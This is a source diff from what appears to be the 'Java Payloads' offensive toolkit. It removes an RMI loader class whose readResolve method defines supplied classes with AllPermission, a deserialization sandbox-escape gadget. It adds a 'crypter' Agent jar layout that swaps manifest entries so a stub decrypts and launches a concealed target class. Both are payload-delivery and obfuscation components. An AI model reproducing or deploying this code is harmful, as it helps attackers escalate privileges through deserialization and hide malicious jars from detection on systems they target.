@@ -1,7 +1,7 @@
 /*
  * Java Payloads.
  * 
- * Copyright (c) 2011 Michael 'mihi' Schierl
+ * Copyright (c) 2012 Michael 'mihi' Schierl
  * All rights reserved.
  * 
  * Redistribution and use in source and binary forms, with or without
@@ -32,43 +32,41 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.loader.rmi;
+package javapayload.crypter;
 
-import java.io.ObjectStreamException;
-import java.io.Serializable;
-import java.net.URL;
-import java.security.AllPermission;
-import java.security.CodeSource;
-import java.security.Permissions;
-import java.security.ProtectionDomain;
-import java.security.cert.Certificate;
+import java.lang.instrument.Instrumentation;
+import java.util.jar.Manifest;
 
-public class Loader extends ClassLoader implements Serializable {
+import javapayload.Parameter;
 
-	public byte[][] classes;
+public class Agent extends TemplateBasedJarLayout {
 
-	public Object[] parameters;
-
-	public Object readResolve() throws ObjectStreamException {
-		try {
-			Class clazz = null;
-			for (int i = 0; i < classes.length; i++) {
-				Permissions permissions = new Permissions();
-				permissions.add(new AllPermission());
-				clazz = defineClass(null, classes[i], 0, classes[i].length, new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
-			}
-			clazz.getConstructor(new Class[] { Object[].class }).newInstance(new Object[] { parameters });
-		} catch (Throwable t) {
-			/* #JDK1.4 */try {
-				throw new RuntimeException(t);
-			} catch (NoSuchMethodError ex) /**/{
-				throw new RuntimeException(t.toString());
-			}
-		}
-		return null;
+	public Agent() {
+		super("Agent Jar", Template.class,
+				"Use this jar layout with Agent Jar files.");
 	}
-	
-	public void go() throws ObjectStreamException {
-		readResolve();
+
+	public Parameter[] getParameters() {
+		return new Parameter[0];
+	}
+
+	public void init(String[] parameters, Manifest manifest) throws Exception {
+		targetClassName = manifest.getMainAttributes().getValue("Agent-Class");
+		manifest.getMainAttributes().putValue("Agent-Class", stubClassName);
+		manifest.getMainAttributes().putValue("Premain-Class", stubClassName);
+	}
+
+	public static class Template {
+		public static Class target;
+
+		public static void agentmain(String agentArgs, Instrumentation inst) throws Exception {
+			TemplateBasedJarLayout.cryptedMain(new String[] { "TARGET_CLASS_NAME", "STUB_CLASS_NAME", "target" });
+			target.getMethod("agentmain", new Class[] { Class.forName("java.lang.String"), Class.forName("java.lang.instrument.Instrumentation") }).invoke(null, new Object[] { agentArgs, inst });
+		}
+
+		public static void premain(String agentArgs, Instrumentation inst) throws Exception {
+			TemplateBasedJarLayout.cryptedMain(new String[] { "TARGET_CLASS_NAME", "STUB_CLASS_NAME", "target" });
+			target.getMethod("premain", new Class[] { Class.forName("java.lang.String"), Class.forName("java.lang.instrument.Instrumentation") }).invoke(null, new Object[] { agentArgs, inst });
+		}
 	}
 }
